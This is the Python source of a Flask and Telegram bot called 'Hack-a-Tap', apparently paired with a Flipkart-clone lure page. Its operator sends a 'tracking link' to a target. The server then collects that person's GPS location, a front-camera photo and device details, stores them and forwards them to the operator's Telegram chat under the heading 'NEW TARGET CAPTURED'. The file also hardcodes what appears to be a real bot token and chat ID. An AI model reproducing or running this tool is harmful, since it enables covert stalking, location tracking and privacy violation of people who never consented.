import os
import json
import base64
import socket
import threading
import requests
import time
from flask import Flask, request, jsonify, send_file

# ─── CONFIG ───────────────────────────────────────────────────────────────────
API_TOKEN = '8800752320:AAFjXbl8PVFt92nLnxD39u48Eq8GNoAXgyc'
CHAT_ID   = '8095263177'
# Use PORT from environment (Render sets this) or default to 5000 for local
WEB_PORT  = int(os.environ.get('PORT', 5000))
# ──────────────────────────────────────────────────────────────────────────────

app = Flask(__name__)

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        return s.getsockname()[0]
    except:
        return '127.0.0.1'
    finally:
        s.close()

LOCAL_IP = get_local_ip()

# Auto-detect public URL: Render provides RENDER_EXTERNAL_URL automatically
# For localtunnel/ngrok, set it manually or use the tunnel URL
RENDER_URL = os.environ.get('RENDER_EXTERNAL_URL')
if RENDER_URL:
    TRACKING_URL = RENDER_URL
else:
    TRACKING_URL = f'http://{LOCAL_IP}:{WEB_PORT}'

# ─── TELEGRAM HELPERS ─────────────────────────────────────────────────────────
TELEGRAM_API = f"https://api.telegram.org/bot{API_TOKEN}"

def send_telegram_text(text):
    requests.post(f"{TELEGRAM_API}/sendMessage", data={
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    })

def send_telegram_photo(photo_path, caption):
    with open(photo_path, 'rb') as photo:
        requests.post(f"{TELEGRAM_API}/sendPhoto", data={
            "chat_id": CHAT_ID,
            "caption": caption,
            "parse_mode": "HTML"
        }, files={"photo": photo})

# ─── TELEGRAM BOT POLLING ─────────────────────────────────────────────────────
last_update_id = 0

def telegram_poll():
    global last_update_id
    print(f"[BOT] Telegram bot started. Listening for commands...")
    while True:
        try:
            resp = requests.get(f"{TELEGRAM_API}/getUpdates", params={
                "offset": last_update_id + 1,
                "timeout": 30
            }, timeout=35)
            data = resp.json()
            if data.get("ok") and data.get("result"):
                for update in data["result"]:
                    last_update_id = update["update_id"]
                    msg = update.get("message", {})
                    text = msg.get("text", "")

                    if text == "/start":
                        send_telegram_text(
                            "🕵️ <b>Hack-a-Tap Bot Active!</b>\n\n"
                            "Commands:\n"
                            "/grab - Generate a tracking link\n"
                            "/status - Check bot status\n"
                            "/help - Show help"
                        )

                    elif text == "/grab":
                        send_telegram_text(
                            f"🔗 <b>Tracking Link Generated!</b>\n\n"
                            f"Send this link to your target:\n"
                            f"<code>{TRACKING_URL}</code>\n\n"
                            f"⚠️ Requirements:\n"
                            f"• Same WiFi/network as target\n"
                            f"• Port {WEB_PORT} must be accessible\n\n"
                            f"📡 You'll receive their:\n"
                            f"  📍 High-accuracy GPS\n"
                            f"  📸 Front camera photo\n"
                            f"  📱 Full device info\n"
                            f"  🔋 Battery level\n"
                            f"  🖥️ GPU, CPU, Screen details"
                        )

                    elif text == "/status":
                        send_telegram_text(
                            f"✅ <b>Bot Status: Online</b>\n\n"
                            f"🌐 Server: <code>{TRACKING_URL}</code>\n"
                            f"📍 Chat ID: <code>{CHAT_ID}</code>\n"
                            f"🔋 Mode: High-Accuracy GPS"
                        )

                    elif text == "/help":
                        send_telegram_text(
                            "📖 <b>Hack-a-Tap Help</b>\n\n"
                            "1️⃣ /grab → get tracking link\n"
                            "2️⃣ Send link to target\n"
                            "3️⃣ Target clicks 'Share Live Location'\n"
                            "4️⃣ Receives in this chat:\n"
                            "   📍 GPS (5-10m accuracy on phones)\n"
                            "   📸 Front camera photo\n"
                            "   📱 Device, OS, Browser, GPU\n"
                            "   🔋 Battery, Screen, RAM, CPU\n"
                            "   🗺️ Google Maps link\n\n"
                            "⚠️ Both devices must be on same network\n"
                            "💡 For remote access, use ngrok"
                        )

        except Exception as e:
            print(f"[BOT] Polling error: {e}")
            time.sleep(5)

# ─── FLASK ROUTES ─────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.json
        device = data.get('device', {})
        location = data.get('location', {})
        photo = data.get('photo')
        timestamp = data.get('timestamp', time.strftime('%Y-%m-%d %H:%M:%S'))

        lat = location.get('latitude', 'Unknown')
        lon = location.get('longitude', 'Unknown')
        acc = location.get('accuracy', 'N/A')
        alt = location.get('altitude', 'N/A')
        heading = location.get('heading', 'N/A')
        speed = location.get('speed', 'N/A')

        # ─── BUILD DETAILED REPORT (Seeker-style) ───────────────────────
        report = f"🚨 <b>NEW TARGET CAPTURED!</b>\n{'━' * 30}\n\n"

        # Location
        report += f"📍 <b>LOCATION (High Accuracy):</b>\n"
        report += f"  • Latitude:  <code>{lat}</code>\n"
        report += f"  • Longitude: <code>{lon}</code>\n"
        report += f"  • Accuracy:  {acc}\n"
        report += f"  • Altitude:  {alt}\n"
        report += f"  • Heading:   {heading}\n"
        report += f"  • Speed:     {speed}\n"

        # Google Maps link
        if lat not in ('Unknown', 'Denied') and lon not in ('Unknown', 'Denied'):
            report += f"  • 🗺️ <a href='https://www.google.com/maps/place/{lat},{lon}'>Open in Google Maps</a>\n"

        report += f"\n{'━' * 30}\n\n"

        # Device Info
        report += f"📱 <b>DEVICE INFO:</b>\n"
        report += f"  • OS:         {device.get('os', 'Unknown')}\n"
        report += f"  • Platform:   {device.get('platform', 'Unknown')}\n"
        report += f"  • Browser:    {device.get('browser', 'Unknown')}\n"
        report += f"  • Language:   {device.get('language', 'Unknown')}\n"
        report += f"  • Battery:    {device.get('battery', 'Unknown')}\n"
        report += f"  • Screen:     {device.get('screen', 'Unknown')}\n"
        report += f"  • CPU Cores:  {device.get('cores', 'Unknown')}\n"
        report += f"  • RAM:        {device.get('ram', 'Unknown')}\n"
        report += f"  • GPU Vendor: {device.get('gpu_vendor', 'Unknown')}\n"
        report += f"  • GPU:        {device.get('gpu_renderer', 'Unknown')}\n"
        report += f"  • Online:     {device.get('online', 'Unknown')}\n"

        report += f"\n{'━' * 30}\n"
        report += f"⏰ {timestamp}"

        # Save and send photo
        if photo:
            photo_data = photo.replace('data:image/png;base64,', '')
            photo_bytes = base64.b64decode(photo_data)

            photos_dir = os.path.join(os.path.dirname(__file__), 'photos')
            os.makedirs(photos_dir, exist_ok=True)
            photo_path = os.path.join(photos_dir, f'capture_{int(time.time())}.png')

            with open(photo_path, 'wb') as f:
                f.write(photo_bytes)

            send_telegram_photo(photo_path, report)
            print(f"[CAPTURE] Photo saved: {photo_path}")
        else:
            report = "📸 <i>(No photo - camera denied)</i>\n\n" + report
            send_telegram_text(report)

        # Save locally
        data_dir = os.path.join(os.path.dirname(__file__), 'data')
        os.makedirs(data_dir, exist_ok=True)
        with open(os.path.join(data_dir, f'capture_{int(time.time())}.json'), 'w') as f:
            json.dump({k: v for k, v in data.items() if k != 'photo'}, f, indent=2)

        print(f"[CAPTURE] Target captured successfully!")
        return jsonify({"message": "ok"}), 200

    except Exception as e:
        print(f"[CAPTURE] Error: {e}")
        return jsonify({"error": str(e)}), 500

# ─── START TELEGRAM BOT (runs in background, works with gunicorn too) ────────
bot_thread = threading.Thread(target=telegram_poll, daemon=True)
bot_thread.start()

# Send startup notification
try:
    _bot_info = requests.get(f'{TELEGRAM_API}/getMe', timeout=5).json().get('result', {})
    _bot_name = _bot_info.get('username', 'Unknown')
    send_telegram_text(
        f"🟢 <b>Bot Started!</b>\n\n"
        f"🌐 Server: <code>{TRACKING_URL}</code>\n"
        f"📍 GPS Mode: High Accuracy\n\n"
        f"Type /grab to generate a tracking link."
    )
    print(f"[BOT] Telegram bot @{_bot_name} started")
    print(f"[BOT] Tracking URL: {TRACKING_URL}")
except Exception as e:
    print(f"[BOT] Startup notification error: {e}")

# ─── LOCAL DEV SERVER (only runs with `python bot.py`, NOT on Render) ─────────
if __name__ == '__main__':
    print("=" * 60)
    print("  🕵️  HACK-A-TAP BOT (Flipkart Clone)")
    print("=" * 60)
    print(f"  🌐 Tracking URL : {TRACKING_URL}")
    print(f"  📍 GPS Mode     : High Accuracy (enableHighAccuracy)")
    print("=" * 60)
    print()
    print(f"[SERVER] Running on http://localhost:{WEB_PORT}")
    print(f"[SERVER] Open http://localhost:{WEB_PORT} in your browser\n")
    app.run(host='0.0.0.0', port=WEB_PORT, debug=False)
